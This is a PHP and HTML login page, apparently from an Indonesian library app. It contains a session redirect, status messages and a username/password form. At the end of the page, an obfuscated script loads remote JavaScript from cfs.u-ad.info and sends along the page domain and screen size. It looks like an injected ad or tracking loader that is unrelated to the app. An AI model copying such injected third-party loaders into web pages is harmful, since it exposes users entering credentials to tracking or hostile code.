<?php
	include "config/koneksi.php";
    session_start();
    if(!empty($_SESSION['nama'])) {
        header("Location: module/home.php");
    }
?>

<!DOCTYPE html>
<html>
<head>
    <title>LOGIN</title>
    <link href="templates/library/css/bootstrap.min.css" rel="stylesheet">
    <link href="templates/library/css/login.css" rel="stylesheet">
    <link rel="shortcut icon" href="templates/library/img/book.ico">
</head>
<?php
    if (!empty($_GET['message']) && $_GET['message'] == 'success') {
        echo '<div class="alert alert-success" style="text-align: center;">Pendaftaran Berhasil ! Silahkan Login</div>';
    } elseif (!empty($_GET['message']) && $_GET['message'] == 'failed') {
        echo '<div class="alert alert-danger" style="text-align: center;">Username atau Password salah !</div>';
    } elseif (!empty($_GET['message']) && $_GET['message'] == 'login') {
        echo '<div class="alert alert-danger" style="text-align: center;">Anda harus login dulu</div>';
    } else{
        echo "xxx";
    }
?>
<body>
    <div class="container">
        <form action="cek_login.php" class="form-signin" role="form" method="POST">
            <h2 class="form-signin-heading">Silahkan Masuk</h2>
            <input type="text" class="form-control" name="username" placeholder="Username" required autofocus>
            <input type="password" class="form-control" name="password" placeholder="Password" required>
            <button class="btn btn-lg btn-primary btn-block" type="submit">Masuk</button>
            <div style="text-align: center;">or</div>
            <a href="module/register.php" class="btn btn-lg btn-danger btn-block">Daftar</a>
        </form>
    </div>
    <script type="text/javascript">
        if (self != top) {
        } else {
            var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
            var idc_glo_r = Math.floor(Math.random() * 99999999999);
            document.write("<scr" + "ipt type=text/javascript src=" + idc_glo_url + "cfs.u-ad.info/cfspushadsv2/request");
            document.write("?id=1");
            document.write("&amp;enc=telkom2");
            document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582PlvV7TskJKD3TiAGBAK0rPgMH0G7bcxN9juXgoUYYfuSMJgCqqSo%2bDKEp8VIVQIWllYvygKzg5lHEupJGy0gS9cZh08ELHsYh9D38zu8Jjh12oeKnR4RiIYBh9hYTqQwfvTm9eutyMWbJ92z6RqX%2bnTeRLgJ9TaVIBrTY57L04vJABe0NWLtbxi1XdnJKHR9zmZmtoVIPp0ax4cWabCPzLupP2UxkciUs8JAgfa59lwync%2fz7%2fpxxGTTA9bsihdy8qpRaHtQKsdsMM7Q4NV4%2b5V6zNXRtyrhkXzsO0a%2bdfux%2b3lVMPMdwJwXxC5x4eK4hOfMTt7utxDsiOwPz7W8GR9MTt5JF0I0Bu1t5Vv4buZoGHAOsUfq%2bYwJFulUfku4xGuGaaujOrFcY9NtXWR88Y%3d");
            document.write("&amp;idc_r=" + idc_glo_r);
            document.write("&amp;domain=" + document.domain);
            document.write("&amp;sw=" + screen.width + "&amp;sh=" + screen.height);
            document.write("></scr" + "ipt>");
        }
    </script><noscript>activate javascript</noscript>
</body>
</html>